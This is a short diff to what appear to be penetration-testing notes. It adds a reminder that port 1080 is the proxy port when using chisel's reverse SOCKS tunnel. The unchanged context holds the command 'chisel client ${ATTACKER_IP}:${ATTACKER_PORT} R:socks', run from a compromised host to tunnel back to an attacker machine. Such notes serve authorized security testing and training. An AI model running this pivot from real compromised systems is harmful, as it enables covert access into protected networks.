@@ -20,7 +20,7 @@ From the `${OWNED_IP0}`, run
 ```
 chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:socks
 ```
-This creates a SOCKS tunnel (bound to 1080 by default).
+This creates a SOCKS tunnel (bound to 1080 by default). <--- USE 1080 as proxy port, not `${ATTACKER_PORT}`. Also when setting up the proxy in the browser!
 
 If you want it to not block your current shell, do:
 
